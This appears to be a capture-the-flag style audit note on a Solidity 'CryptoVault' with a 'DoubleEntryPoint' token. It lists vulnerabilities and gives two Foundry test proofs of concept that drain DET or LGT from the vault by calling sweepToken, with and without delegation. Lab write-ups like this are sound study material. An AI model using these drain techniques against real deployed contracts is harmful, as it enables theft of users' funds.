# Crypto Vault

## Invariants

1. `SweepTokens` allows tu recover stuck tokens
2. `Swaps ERC20` for `DET` if delegate.

## Target

- Protect `CryptoVault` from being drained.

## Potential Vulnerabilities

1. Malicious `DelegateERC20` can `swap` and `sweep` draining ilegitimately swept tokens previoulsy.

2. Anyone can damage `DoubleEntryPoint` if delegate:
   1. true: drain `DET`
   2. false: drain `LGT`

# 1 Vulnerability

**Proof of concept:**

# 2 Vulnerability

**Proof of concept:**

Anyone can drain to Vault's recipient address:

  <details>

   <summary> 1:Draining DET</summary>

```javascript
  function testDrainsDETWithDelegate() public {
      //Already delegated at setUp
      vault.sweepToken(lgt);

      uint256 vaultBalance = det.balanceOf(address(vault));

      assertEq(vaultBalance, 0);
  }
```

</details>

<details>
   <summary> 2: Draining LGT</summary>

```javascript
    function testDraisLGTwithoutDelegatge() public {
       //Remove Delegation
       vm.prank(owner);
       lgt.delegateToNewContract(DoubleEntryPoint(address(0)));

       vault.sweepToken(lgt);

       uint256 vaultBalance = lgt.balanceOf(address(vault));

       assertEq(vaultBalance, 0);
    }
```

</details>
